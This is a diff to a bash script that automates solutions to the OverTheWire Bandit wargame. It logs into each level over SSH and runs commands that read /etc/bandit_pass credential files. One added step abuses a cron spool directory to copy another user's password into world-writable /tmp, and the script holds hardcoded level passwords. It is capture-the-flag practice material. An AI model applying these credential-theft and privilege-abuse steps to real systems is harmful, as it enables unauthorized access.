@@ -21,14 +21,15 @@ COMMANDS=(
   "diff --new-line-format='%L' --old-line-format='' --unchanged-line-format='' passwords.old passwords.new"
   "cat readme"
   "./bandit20-do cat /etc/bandit_pass/bandit20"
-  "{ echo '0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO'; sleep 2; } | nc -lp 2222 & ./suconnect 2222"
+  "bash -c 'timeout 6s sh -c \"printf \\\"%s\\\\n\\\" \\\"0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO\\\" | nc -l -p 2222 & sleep 2; ./suconnect 2222\"'"
   "cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv"
   "cat /tmp/8ca319486bfbbc3663ea0fbe81326349"
+  "mkdir /tmp/bandit24-pwd/; chmod 777 /tmp/bandit24-pwd/; echo 'cat /etc/bandit_pass/bandit24 > /tmp/bandit24-pwd/password.txt' > /var/spool/bandit24/foo/copy_password.sh; chmod +x /var/spool/bandit24/foo/copy_password.sh; while [ ! -f /tmp/bandit24-pwd/password.txt ]; do sleep 1; done; cat /tmp/bandit24-pwd/password.txt"
   "echo 'Final Level'"
 )
 
-for i in {0..23}; do
-  echo "[Note] Connecting to bandit$i with password $PASSWORD and executing \$(${COMMANDS[$i]})"
+for i in {0..24}; do
+  echo -e "\e[33m[NOTE]\e[0m Connecting to \e[32mbandit$i\e[0m with password \e[31m$PASSWORD\e[0m and executing \e[34m\$(${COMMANDS[$i]})\e[0m"
   OUTPUT=$(sshpass -p "$PASSWORD" ssh -q \
     -o PreferredAuthentications=password -o PubkeyAuthentication=no \
     bandit$i@bandit.labs.overthewire.org -p 2220 \
@@ -50,7 +51,7 @@ for i in {0..23}; do
         PASSWORD=$(ssh -i sshkey.private -q -o IdentitiesOnly=yes \
           bandit17@bandit.labs.overthewire.org -p 2220 \
           "cat /etc/bandit_pass/bandit17" 2> /dev/null) ;;
-    20) PASSWORD=$(echo "$OUTPUT" | awk -F'Read:' '/Read:/ {print $1}') ;;
+    20) PASSWORD=$(echo "$OUTPUT" | grep -E '^[A-Za-z0-9]{32}$' | tail -n1) ;;
     *) PASSWORD=$OUTPUT ;;
   esac
 done
